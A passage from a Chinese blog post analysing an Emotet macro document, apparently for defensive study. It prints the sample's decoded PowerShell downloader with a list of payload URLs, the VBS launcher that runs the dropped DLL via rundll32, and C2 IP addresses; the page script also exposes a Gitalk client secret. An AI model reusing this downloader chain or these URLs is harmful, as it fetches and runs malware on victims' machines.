BsAGUALwBFAFcAMgA0AEEAWQBKAEMAdgBCAHAATgA4AEcAYwAvACwAaAB0AHQAcAA6AC8ALwBoAG8AbQBlAGgAYQBuAGQAeQB3AG8AcgBrAHMALgBjAG8AbQAvAGUAbABuAC0AaQBtAGEAZwBlAHMALwB4AEYASQBEAFAAZgBzADQAUwBTADEAeQB3ADcAZwBoAFgAWABrAC8ALABoAHQAdABwADoALwAvAGgAaQAtAHQAZQBjAGgAYQB1AGQAaQBvAC4AYwBvAG0ALwBkAGkAcgAyADAAMgAxAC8AZwAzAGQALwAsAGgAdAB0AHAAOgAvAC8AcgBvAGQAZQByAGkAYwBrAHAAbwB3AGUAbABsAGUAbgB0AGUAcgB0AGEAaQBuAG0AZQBuAHQALgBjAG8AbQAvAGUAbABuAC0AaQBtAGEAZwBlAHMALwBPAFYATwB5AE4AMwB5ADkALwAsAGgAdAB0AHAAcwA6AC8ALwBjAG8AbgBzAGMAaQBlAG4AYwBlAHMALgBjAGUAbgB0AGUAcgAvAHcAcAAtAGkAbgBjAGwAdQBkAGUAcwAvAFMAawBXADIAdwAvACwAaAB0AHQAcAA6AC8ALwBtAGEAZwAtAGQAZQBzAGkAZwBuAHMALgBjAG8AbQAvAGMAcwBzAC8ATAAzAFEASwBsAHIANgBpAFQAegBJAEwAVgB6AGIAbgBDAC8AIgAuAHMAUABMAEkAdAAoACIALAAiACkAOwAgAGYAbwBSAGUAQQBDAGgAKAAkAHkASQBkAHMAUgBoAHkAZQAzADQAcwB5AHUAZgBnAHgAagBjAGQAZgAgAGkATgAgACQATQBKAFgAZABmAHMAaABEAHIAZgBHAFoAcwBlAHMANAApACAAewAkAEcAdwBlAFkASAA1ADcAcwBlAGQAcwB3AGQAPQAoACIAYwBpAHUAdwBkADoAaQB1AHcAZABcAHAAcgBpAHUAdwBkAG8AZwBpAHUAdwBkAHIAYQBtAGkAdQB3AGQAZABhAHQAaQB1AHcAZABhAFwAcAB1AGkAaABvAHUAZAAuAGQAaQB1AHcAZABsAGkAdQB3AGQAbAAiACkALgByAGUAUABsAEEAQwBlACgAIgBpAHUAdwBkACIALAAiACIAKQA7AGkAbgBWAE8AawBlAC0AdwBlAEIAcgBFAHEAVQBlAHMAVAAgAC0AdQBSAEkAIAAkAHkASQBkAHMAUgBoAHkAZQAzADQAcwB5AHUAZgBnAHgAagBjAGQAZgAgAC0AbwBVAHQARgBJAGwAZQAgACQARwB3AGUAWQBIADUANwBzAGUAZABzAHcAZAA7AGkARgAoAHQAZQBTAHQALQBwAEEAVABoACAAJABHAHcAZQBZAEgANQA3AHMAZQBkAHMAdwBkACkAewBpAGYAKAAoAGcARQB0AC0AaQB0AEUAbQAgACQARwB3AGUAWQBIADUANwBzAGUAZABzAHcAZAApAC4AbABlAE4ARwB0AGgAIAAtAGcAZQAgADQANwA0ADMANgApAHsAYgBSAGUAYQBrADsAfQB9AH0A

再次解析得
$MJXdfshDrfGZses4="http://alivesystems.com/eln-images/pm2rSsnVM/,http://don-lee.com/_notes/U6H14DNA/,http://mellow60s.com/Stanley_files/EFIqwZ183rfmd/,http://pro-ficientllc.com/PDF_files/5A9W8/,http://lost-earth.com/Black_and_White/ZW4rHEdD1vZX/,http://creedmoorpartners.com/eln-images/wEYKd5KJZETheBswq/,http://mattersoffact.com/cgi/E0C1vtSqt/,http://pureplatinumband.com/Schedule/EW24AYJCvBpN8Gc/,http://homehandyworks.com/eln-images/xFIDPfs4SS1yw7ghXXk/,http://hi-techaudio.com/dir2021/g3d/,http://roderickpowellentertainment.com/eln-images/OVOyN3y9/,https://consciences.center/wp-includes/SkW2w/,http://mag-designs.com/css/L3QKlr6iTzILVzbnC/".sPLIt(","); foReACh($yIdsRhye34syufgxjcdf iN $MJXdfshDrfGZses4) {$GweYH57sedswd=("c:\programdata\puihoud.dll").rePlACe("","");inVOke-weBrEqUesT -uRI $yIdsRhye34syufgxjcdf -oUtFIle $GweYH57sedswd;iF(teSt-pATh $GweYH57sedswd){if((gEt-itEm $GweYH57sedswd).leNGth -ge 47436){bReak;}}}</code></pre>



<p>c:\programdata\tjspowj.vbs</p>
<pre class="language-vbscript" data-language="vbscript"><code class="language-vbscript">wscript.createobject(WScript.Shell).run "c:\programdata\uidpjewl.bat",0,true
wscript.createobject(WScript.Shell).run "cmd /c start /B c:\windows\syswow64\rundll32.exe c:\programdata\puihoud.dll,tjpleowdsyf",0</code></pre>



<p>至此 我们 可以清楚，该 恶意文件，通过 宏生成 vbs和bat文件，随后使用 wscript 执行 vbs 脚本。 vbs脚本调用cmd 执行 bat脚本，bat脚本调用powershell下载恶意DLL文件， 随后vbs脚本使用rundll32 执行dll文件。 </p>
<h3 id="3-3-DLL-文件分析"><a href="#3-3-DLL-文件分析" class="headerlink" title="3.3 DLL 文件分析"></a>3.3 DLL 文件分析</h3><p>不会DLL 分析了， 只能放到沙箱跑了下，后续DLL文件行为如下：</p>
<ol>
<li>C:\Windows\system32\rundll32.exe “c:\programdata\puihoud.dll”,DllRegisterServer 重新使用rundll32 加载自己， 加载函数变为 DllRegisterServer</li>
<li>释放可执行文件 C:\Users\admin\AppData\Local\Zeoritohqqgtc\mmoqnlsiof.kiz</li>
<li>启动  C:\Windows\system32\rundll32.exe “C:\Users\admin\AppData\Local\Zeoritohqqgtc\mmoqnlsiof.kiz”,mCRdEzvwblrt</li>
<li>切换函数 C:\Windows\system32\rundll32.exe “C:\Users\admin\AppData\Local\Zeoritohqqgtc\mmoqnlsiof.kiz”,DllRegisterServer</li>
<li>并与 C2 服务器通信 103.42.57.17 / 116.124.128.206</li>
</ol>
<p>完整执行链路如下 ：</p>
<img src="/assets/image-20220216184832492.png" alt="image-20220216184832492" style="zoom:150%;">

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        Author:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">Aspirepig</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        Link:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://blog.161695.xyz/2022/02/16/emotet-gong-ji-yang-ben-fen-xi/">https://blog.161695.xyz/2022/02/16/emotet-gong-ji-yang-ben-fen-xi/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        Reprint policy:
                    </i>
                </span>
                <span class="reprint-info">
                    All articles in this blog are used except for special statements
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    reprint policy. If reproduced, please indicate source
                    <a href="/about" target="_blank">Aspirepig</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/Emotet/">
                                    <span class="chip bg-color">Emotet</span>
                                </a>
                            
                                <a href="/tags/macro/">
                                    <span class="chip bg-color">macro</span>
                                </a>
                            
                                <a href="/tags/windows/">
                                    <span class="chip bg-color">windows</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    
        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
<link rel="stylesheet" href="/css/my-gitalk.css">

<div class="card gitalk-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="gitalk-container" class="card-content"></div>
</div>

<script src="/libs/gitalk/gitalk.min.js"></script>
<script>
    let gitalk = new Gitalk({
        clientID: 'eeb203cbafbf211b9d6b',
        clientSecret: '54c58335381911e065959f2f3debcb57e3c24629',
        repo: 'gittalk',
        owner: 'aspirepigshadow',
        admin: "aspirepigshadow",
        id: '2022-02-16T16-02-07',
        distractionFreeMode: false  // Facebook-like distraction free mode
    });

    gitalk.render('gitalk-container');
</script>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
            <div class="card">
                <a href="/2022/02/18/hui-pu-t610-an-zhuang-hei-qun-hui-ji-qi-pei-zhi/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="惠普T610 安装黑群晖及其配置">
                        
                        <span class="card-title">惠普T610 安装黑群晖及其配置</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2022-02-18
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            Aspirepig
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/nas/">
                        <span class="chip bg-color">nas</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                Next&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2022/01/16/gong-zuo-xiao-lu-ti-sheng/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="工作效率提升">
                        
                        <span class="card-title">工作效率提升</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-16
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            Aspirepig
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/javascript/">
                        <span class="chip bg-color">javascript</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h1, h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h1, h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2025</span>
            
            <a href="/about" target="_blank">Aspirepig</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;Total Words:&nbsp;<span
                        class="white-color">46k</span>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;Total visits:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;Total visitors:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/AspirePig" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>















    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    

    <!-- 雪花特效 -->
    

    <!-- 鼠标星星特效 -->
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

<script>
    var _hmt = _hmt || [];
    (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?f22d47f7e2eff37039f9e60a3d9c9940";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();
</script>

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
